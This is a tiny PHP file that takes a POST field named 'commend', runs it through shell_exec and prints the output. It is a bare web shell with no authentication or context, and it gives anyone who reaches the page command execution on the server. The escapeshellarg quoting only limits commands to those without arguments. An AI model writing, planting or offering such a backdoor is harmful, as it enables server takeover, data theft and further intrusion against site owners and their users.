<?php
	$commend = escapeshellarg($_POST["commend"]);
	$result = shell_exec($commend);
	echo $result;
?>
